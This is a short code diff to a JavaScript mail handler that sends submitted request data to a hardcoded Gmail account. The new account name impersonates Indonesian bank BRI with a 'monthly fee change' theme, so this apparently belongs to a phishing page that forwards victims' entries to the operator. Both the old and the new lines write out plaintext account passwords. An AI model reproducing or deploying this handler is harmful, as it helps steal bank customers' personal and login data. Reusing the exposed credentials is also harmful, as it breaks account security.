@@ -6,15 +6,15 @@ export default function (req, res) {
       port: 587,
       host: 'smtp.gmail.com',
       auth: {
-          user: 'Diamondgoldid@gmail.com',
-          pass: 'Binomo123',
+          user: 'Bankbriperubahantarifbulanan@gmail.com',
+          pass: 'cengal oki',
           },
       secure: false,
     });
 
     const mailData = {
-        from: 'Diamondgoldid@gmail.com',
-        to: 'Diamondgoldid@gmail.com',
+        from: 'Bankbriperubahantarifbulanan@gmail.com',
+        to: 'Bankbriperubahantarifbulanan@gmail.com',
         subject: 'Email Konfirmasi',
         text: body
         
